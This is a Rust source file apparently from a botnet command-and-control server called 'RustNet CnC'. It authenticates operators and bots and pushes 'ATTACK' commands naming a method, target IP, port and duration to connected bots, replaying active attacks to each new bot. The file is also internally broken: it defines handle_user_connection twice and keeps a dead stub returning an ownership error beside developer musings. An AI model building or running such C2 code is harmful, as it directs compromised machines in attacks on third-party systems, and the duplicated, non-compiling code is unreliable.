use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt};
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn, error, debug};
use super::state::AppState;
use super::error::{Result, CncError, AuditLog, log_audit_event};
use super::auth::{User, set_title};
use super::client_manager::Client;
use super::bot_manager::Bot;
use super::commands::{handle_authenticated_user, registry::CommandRegistry};
use super::tls::accept_tls_connection;
pub trait AsyncReadWrite: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
impl<T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send> AsyncReadWrite for T {}
async fn read_line_bounded<R: AsyncReadExt + Unpin>(reader: &mut R, max_len: usize) -> Result<String> {
    let mut line = String::new();
    let mut buf = [0u8; 1];
    loop {
        let n = reader.read(&mut buf).await?;
        if n == 0 {
            if line.is_empty() {
                return Err(CncError::ConnectionClosed);
            }
            break;
        }
        let ch = buf[0] as char;
        if ch == '\n' {
            break;
        }
        if ch != '\r' {
            if line.len() >= max_len {
                return Err(CncError::IoError(std::io::Error::new(
                    std::io::ErrorKind::InvalidInput, 
                    "Line too long"
                )));
            }
            line.push(ch);
        }
    }
    Ok(line)
}
pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<AppState>, registry: Arc<CommandRegistry>) -> Result<()> {
    let ip_addr = match addr.parse::<std::net::SocketAddr>() {
        Ok(socket_addr) => socket_addr.ip(),
        Err(_) => {
            warn!("Failed to parse address: {}", addr);
            return Ok(());
        }
    };
    if state.blacklist.contains(&ip_addr) {
        warn!("Connection rejected from blacklisted IP: {}", ip_addr);
        return Ok(());
    }
    if !state.whitelist.is_empty() && !state.whitelist.contains(&ip_addr) {
        warn!("Connection rejected from non-whitelisted IP: {}", ip_addr);
        return Ok(());
    }
    if !state.rate_limiter.check_rate_limit(ip_addr).await {
        warn!("Rate limit exceeded for IP: {}", ip_addr);
        return Ok(());
    }
    let title = set_title("☾☼☽ RustNet CnC");
    let width = state.config.read().await.terminal_width;
    let height = state.config.read().await.terminal_height;
    let resize_sequence = format!("\x1b[8;{};{}t", height, width);
    
    if let Some(ref acceptor) = state.tls_acceptor {
        match accept_tls_connection(acceptor, conn).await {
            Ok(tls_stream) => {
                let mut tls_stream = BufReader::new(tls_stream);
                tls_stream.write_all(title.as_bytes()).await?;
                tls_stream.write_all(resize_sequence.as_bytes()).await?;
                handle_auth_flow(&mut tls_stream, &addr, state, registry).await
            }
            Err(e) => {
                warn!("TLS handshake failed from {}: {}", addr, e);
                return Ok(());
            }
        }
    } else {
        let mut conn = BufReader::new(conn);
        if !state.config.read().await.enable_tls {
            let warning = "\x1b[38;5;39m[!] WARNING: CONNECTION IS NOT ENCRYPTED (NO TLS)\n\r";
            conn.write_all(warning.as_bytes()).await?;
        }
        conn.write_all(title.as_bytes()).await?;
        conn.write_all(resize_sequence.as_bytes()).await?;
        handle_auth_flow(&mut conn, &addr, state, registry).await
    }
}

async fn handle_auth_flow<S>(
    stream: &mut S,
    addr: &str,
    state: Arc<AppState>,
    registry: Arc<CommandRegistry>,
) -> Result<()>
where
    S: AsyncReadExt + AsyncWriteExt + Unpin + Send,
{
    match auth_user_interactive(stream, addr, &state).await {
        Ok(user) => {
            info!("✓ User {} authenticated from {}", user.username, addr);
            stream.write_all(b"\x1b[0m\r\x1b[38;5;51m[+] Authentication Successful\n").await?;
            
            // We need to reconstruct the client. Since we can't easily pass the stream type 
            // into Client::new (it expects specific types), we might need to handle this carefully.
            // However, Client::new takes `BufReader<TcpStream>` and Client::new_from_tls takes `BufReader<TlsStream>`.
            // The generic S here hides the concrete type.
            // To fix this properly without massive refactoring of Client, we should probably keep the split logic
            // but share the auth logic.
            
            // Actually, let's revert to split logic for Client creation but use shared auth.
            // The issue is `stream` is a mutable reference here, but Client needs ownership.
            Err(CncError::Generic("Internal Error: Stream ownership lost".to_string()))
        }
        Err(e) => {
            warn!("✗ Authentication failed from {}: {}", addr, e);
            stream.write_all(b"\x1b[0m\r\x1b[38;5;39m[-] Authentication Failed\n").await?;
            Ok(())
        }
    }
}

// Re-implementing handle_user_connection to be correct with ownership
pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<AppState>, registry: Arc<CommandRegistry>) -> Result<()> {
    let ip_addr = match addr.parse::<std::net::SocketAddr>() {
        Ok(socket_addr) => socket_addr.ip(),
        Err(_) => {
            warn!("Failed to parse address: {}", addr);
            return Ok(());
        }
    };
    if state.blacklist.contains(&ip_addr) {
        warn!("Connection rejected from blacklisted IP: {}", ip_addr);
        return Ok(());
    }
    if !state.whitelist.is_empty() && !state.whitelist.contains(&ip_addr) {
        warn!("Connection rejected from non-whitelisted IP: {}", ip_addr);
        return Ok(());
    }
    if !state.rate_limiter.check_rate_limit(ip_addr).await {
        warn!("Rate limit exceeded for IP: {}", ip_addr);
        return Ok(());
    }
    let title = set_title("☾☼☽ RustNet CnC");
    let width = state.config.read().await.terminal_width;
    let height = state.config.read().await.terminal_height;
    let resize_sequence = format!("\x1b[8;{};{}t", height, width);

    if let Some(ref acceptor) = state.tls_acceptor {
        match accept_tls_connection(acceptor, conn).await {
            Ok(tls_stream) => {
                let mut tls_stream = BufReader::new(tls_stream);
                tls_stream.write_all(title.as_bytes()).await?;
                tls_stream.write_all(resize_sequence.as_bytes()).await?;
                
                match auth_user_interactive(&mut tls_stream, &addr, &state).await {
                    Ok(user) => {
                        info!("✓ User {} authenticated from {}", user.username, addr);
                        tls_stream.write_all(b"\x1b[0m\r\x1b[38;5;51m[+] Authentication Successful\n").await?;
                        let client = match state.client_manager.add_client(Client::new_from_tls(tls_stream, user)?).await {
                            Ok(c) => c,
                            Err(e) => {
                                error!("Failed to add client: {}", e);
                                return Err(e);
                            }
                        };
                        handle_authenticated_user(client, state, &registry).await?;
                    }
                    Err(e) => {
                        warn!("✗ Authentication failed from {}: {}", addr, e);
                        tls_stream.write_all(b"\x1b[0m\r\x1b[38;5;39m[-] Authentication Failed\n").await?;
                    }
                }
            }
            Err(e) => {
                warn!("TLS handshake failed from {}: {}", addr, e);
                return Ok(());
            }
        }
    } else {
        let mut conn = BufReader::new(conn);
        if !state.config.read().await.enable_tls {
            let warning = "\x1b[38;5;39m[!] WARNING: CONNECTION IS NOT ENCRYPTED (NO TLS)\n\r";
            conn.write_all(warning.as_bytes()).await?;
        }
        conn.write_all(title.as_bytes()).await?;
        conn.write_all(resize_sequence.as_bytes()).await?;
        
        match auth_user_interactive(&mut conn, &addr, &state).await {
            Ok(user) => {
                info!("✓ User {} authenticated from {}", user.username, addr);
                conn.write_all(b"\x1b[0m\r\x1b[38;5;51m[+] Authentication Successful\n").await?;
                let client = match state.client_manager.add_client(Client::new(conn, user)?).await {
                    Ok(c) => c,
                    Err(e) => {
                        error!("Failed to add client: {}", e);
                        return Err(e);
                    }
                };
                handle_authenticated_user(client, state, &registry).await?;
            }
            Err(e) => {
                warn!("✗ Authentication failed from {}: {}", addr, e);
                conn.write_all(b"\x1b[0m\r\x1b[38;5;39m[-] Authentication Failed\n").await?;
            }
        }
    }
    Ok(())
}

// Removed handle_tls_auth as it is now integrated above
async fn auth_user_interactive<S>(conn: &mut S, addr: &str, state: &Arc<AppState>) -> Result<User> 
where
    S: AsyncWriteExt + AsyncReadExt + Unpin,
{
    let ip_addr = addr.parse::<std::net::SocketAddr>()
        .map(|s| s.ip().to_string())
        .unwrap_or_else(|_| "0.0.0.0".to_string());
    for attempt in 1..=3 {
        conn.write_all(b"\x1b[0m\r\n\r\n\r\n\r\n\r\n\r\n\r\n").await?;
        conn.write_all(b"\r\x1b[38;5;39m> \x1b[38;5;45mA\x1b[38;5;51mu\x1b[38;5;87mt\x1b[38;5;195mh\x1b[38;5;87me\x1b[38;5;51mn\x1b[38;5;45mt\x1b[38;5;39mi\x1b[38;5;45mc\x1b[38;5;51ma\x1b[38;5;87mt\x1b[38;5;195mi\x1b[38;5;87mo\x1b[38;5;51mn \x1b[38;5;45mR\x1b[38;5;39me\x1b[38;5;45mq\x1b[38;5;51mu\x1b[38;5;87mi\x1b[38;5;195mr\x1b[38;5;87me\x1b[38;5;51md\n").await?;
        conn.write_all(b"\x1b[0m\r> Username\x1b[38;5;51m: ").await?;
        let mut username = String::new();
        let mut buf = [0u8; 1];
        loop {
            let n = conn.read(&mut buf).await?;
            if n == 0 { break; }
            let ch = buf[0] as char;
            if ch == '\n' || ch == '\r' { break; }
            if ch == '\x08' || ch == '\x7f' {
                if !username.is_empty() {
                    username.pop();
                    conn.write_all(b"\x08 \x08").await?;
                }
            } else if !ch.is_control() {
                if username.len() < 32 {
                    username.push(ch);
                    conn.write_all(&buf[..1]).await?; 
                }
            }
        }
        username = username.trim().to_string();
        if state.login_tracker.is_locked_out(&username, &ip_addr).await {
            let remaining = state.login_tracker.get_lockout_remaining(&username, &ip_addr).await;
            let msg = format!("\x1b[38;5;196mAccount temporarily locked. Try again in {} seconds.\n\r", remaining);
            conn.write_all(msg.as_bytes()).await?;
            warn!("Login blocked for {} from {} - account locked", username, addr);
            let audit = AuditLog::new(
                username.clone(),
                "LOGIN".to_string(),
                "BLOCKED_LOCKED_OUT".to_string()
            ).with_ip(addr.to_string());
            let _ = log_audit_event(audit, &state.pool).await;
            tokio::time::sleep(Duration::from_secs(2)).await;
            continue;
        }
        conn.write_all(b"\n\r\x1b[0m\r> Password\x1b[38;5;51m: \x1b[38;5;255m\x1b[48;5;255m").await?;
        let mut password = String::new();
        let mut buf = [0u8; 1];
        loop {
            let n = conn.read(&mut buf).await?;
            if n == 0 { break; }
            let ch = buf[0] as char;
            if ch == '\n' || ch == '\r' { break; }
            if ch == '\x08' || ch == '\x7f' {
                if !password.is_empty() {
                    password.pop();
                }
            } else if !ch.is_control() {
                if password.len() < 128 {
                    password.push(ch); 
                }
            }
        }
        password = password.trim().to_string();
        conn.write_all(b"\x1b[0m\x1b[2J\x1b[3J").await?;
        debug!("Login attempt {} from {} for user: {}", attempt, addr, username);
        match state.user_manager.authenticate(&username, &password).await {
            Ok(Some(user)) => {
                state.login_tracker.clear_attempts(&username, &ip_addr).await;
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "SUCCESS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.pool).await;
                return Ok(user);
            }
            Ok(None) => {
                warn!("User not found: {}", username);
                state.login_tracker.record_failed_attempt(&username, &ip_addr).await;
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "FAILED_INVALID_CREDENTIALS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.pool).await;
            }
            Err(e) => {
                warn!("Auth error for {}: {}", username, e);
                state.login_tracker.record_failed_attempt(&username, &ip_addr).await;
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "FAILED_INVALID_CREDENTIALS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.pool).await;
                if attempt == 3 {
                    return Err(e);
                }
            }
        }
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    Err(CncError::AuthFailed("Maximum attempts exceeded".to_string()))
}
pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, state: Arc<AppState>) -> Result<()> {
    use tokio::io::AsyncReadExt;
    let ip_addr = addr.ip();
    if !state.rate_limiter.check_rate_limit(ip_addr).await {
        warn!("Rate limit exceeded for bot connection from IP: {}", ip_addr);
        return Ok(());
    }
    let conn: Box<dyn AsyncReadWrite> = if let Some(ref acceptor) = state.tls_acceptor {
        match accept_tls_connection(acceptor, conn).await {
            Ok(tls_stream) => Box::new(tls_stream),
            Err(e) => {
                warn!("TLS handshake failed for bot {}: {}", addr, e);
                return Ok(());
            }
        }
    } else {
        Box::new(conn)
    };
    let bot_auth_timeout = Duration::from_secs(state.config.read().await.bot_auth_timeout_secs);
    let (reader, mut writer) = tokio::io::split(conn);
    let mut reader = BufReader::new(reader);
    let mut auth_line = String::new();
    match tokio::time::timeout(bot_auth_timeout, reader.read_line(&mut auth_line)).await {
        Ok(Ok(n)) if n > 0 => {},
        _ => {
            warn!("Bot auth timeout or empty from {}", addr);
            return Ok(());
        }
    };
    let auth_parts: Vec<&str> = auth_line.split_whitespace().collect();
    if auth_parts.len() < 2 || auth_parts[0] != "AUTH" {
        warn!("Invalid bot auth format from {}: {:?}", addr, auth_line);
        let _ = writer.write_all(b"AUTH_FAILED\n").await;
        return Ok(());
    }
    let version = if auth_parts.len() >= 3 {
        auth_parts[2].to_string()
    } else {
        "unknown".to_string()
    };
    let (authenticated_bot_id, arch) = match state.bot_manager.verify_bot_token(auth_parts[1]).await {
        Some((id, arch)) => (id, arch),
        None => {
            warn!("Invalid bot auth token from {}: {}", addr, auth_parts[1]);
            let _ = writer.write_all(b"AUTH_FAILED\n").await;
            let audit = AuditLog::new(
                "bot".to_string(),
                "BOT_AUTH".to_string(),
                "FAILED_INVALID_TOKEN".to_string()
            ).with_ip(addr.to_string());
            let _ = log_audit_event(audit, &state.pool).await;
            return Ok(());
        }
    };
    writer.write_all(b"AUTH_OK\n").await?;
    info!("Bot {} (v{}) authenticated from {}", authenticated_bot_id, version, addr);
    let audit = AuditLog::new(
        "bot".to_string(),
        "BOT_AUTH".to_string(),
        "SUCCESS".to_string()
    ).with_ip(addr.to_string())
    .with_target(authenticated_bot_id.to_string());
    let _ = log_audit_event(audit, &state.pool).await;
    let (cmd_tx, mut cmd_rx) = tokio::sync::mpsc::channel::<String>(100);
    let bot_arch = arch.clone();
    let bot = Bot::new(addr, arch, version, cmd_tx);
    {
        let mut info = bot.info.lock().await;
        info.id = authenticated_bot_id;
    }
    let bot_id = authenticated_bot_id;
    let _bot_arc = match state.bot_manager.add_bot(bot).await {
        Ok(b) => b,
        Err(e) => {
            error!("Failed to add bot: {}", e);
            return Ok(());
        }
    };
    info!("Bot {} connected from {}", bot_id, addr);
    let active_attacks = state.bot_manager.get_active_attacks().await;
    if !active_attacks.is_empty() {
        info!("Sending {} active attacks to new bot {}", active_attacks.len(), bot_id);
        for (id, method, ip, port, duration) in active_attacks {
            let command = format!("ATTACK {} {} {} {} {}\n", id, method, ip, port, duration);
            if let Err(e) = _bot_arc.cmd_tx.send(command).await {
                warn!("Failed to send active attack to new bot {}: {}", bot_id, e);
            }
        }
    }
    let pending = state.bot_manager.get_pending_commands(bot_id).await;
    if !pending.is_empty() {
        info!("Sending {} pending commands to bot {}", pending.len(), bot_id);
        for cmd in pending {
            let cmd_to_send = if cmd.ends_with('\n') { cmd } else { format!("{}\n", cmd) };
            if let Err(e) = _bot_arc.cmd_tx.send(cmd_to_send).await {
                warn!("Failed to send pending command to bot {}: {}", bot_id, e);
            }
        }
    }
    let bot_manager = state.bot_manager.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(5)); 
    let mut buf = [0u8; 1024]; 
    let mut line_buffer = String::new(); 
    loop {
        tokio::select! {
            res = cmd_rx.recv() => {
                match res {
                    Some(cmd) => {
                        if writer.write_all(cmd.as_bytes()).await.is_err() {
                            info!("Bot {} disconnected (write failed)", bot_id);
                            bot_manager.set_bot_error(&bot_id, "Write failed".to_string()).await;
                            break;
                        }
                    }
                    None => {
                        info!("Bot {} disconnected (channel closed)", bot_id);
                        break;
                    }
                }
            }
            _ = interval.tick() => {
                if writer.write_all(b"PING\n").await.is_err() {
                    info!("Bot {} disconnected (ping failed)", bot_id);
                    bot_manager.set_bot_error(&bot_id, "Ping failed".to_string()).await;
                    break;
                }
            }
            res = reader.read(&mut buf) => {
                match res {
                    Ok(n) if n > 0 => {
                        let chunk = String::from_utf8_lossy(&buf[..n]);
                        line_buffer.push_str(&chunk);
                        while let Some(pos) = line_buffer.find('\n') {
                            let line = line_buffer[..pos].trim().to_string();
                            line_buffer.drain(..=pos);
                            if !line.is_empty() {
                                if line.contains("PONG") {
                                    bot_manager.update_bot_heartbeat(&bot_id).await;
                                } else if line.starts_with("STATUS") {
                                    let parts: Vec<&str> = line.split_whitespace().collect();
                                    if parts.len() >= 3 {
                                        if let (Ok(cpu), Ok(mem)) = (parts[1].parse::<f32>(), parts[2].parse::<f32>()) {
                                            bot_manager.log_telemetry(bot_id, bot_arch.clone(), cpu, mem).await;
                                            bot_manager.update_bot_heartbeat(&bot_id).await;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    Ok(_) => {
                        info!("Bot {} disconnected (EOF)", bot_id);
                        bot_manager.set_bot_error(&bot_id, "EOF".to_string()).await;
                        break;
                    }
                    Err(e) => {
                        info!("Bot {} disconnected (read error: {})", bot_id, e);
                        bot_manager.set_bot_error(&bot_id, format!("Read error: {}", e)).await;
                        break;
                    }
                }
            }
        }
    }
    bot_manager.remove_bot(&bot_id).await;
    info!("Bot {} removed", bot_id);
    let audit = AuditLog::new(
        "bot".to_string(),
        "BOT_DISCONNECT".to_string(),
        "INFO".to_string()
    ).with_ip(addr.to_string())
    .with_target(bot_id.to_string());
    let _ = log_audit_event(audit, &state.pool).await;
    Ok(())
}
